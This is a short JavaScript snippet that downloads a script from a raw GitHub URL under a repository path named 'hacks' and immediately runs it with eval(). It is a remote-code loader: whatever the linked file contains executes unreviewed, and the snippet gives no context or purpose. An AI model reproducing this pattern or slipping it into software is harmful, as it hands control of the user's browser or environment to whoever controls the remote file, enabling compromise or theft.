let textEval = await fetch('https://raw.githubusercontent.com/dec3ptions/dec3ptions/hacks/dec3ptions/blueprint/dec3ptions_1_specific.js') 
  .then(response => response.text());
  eval(textEval);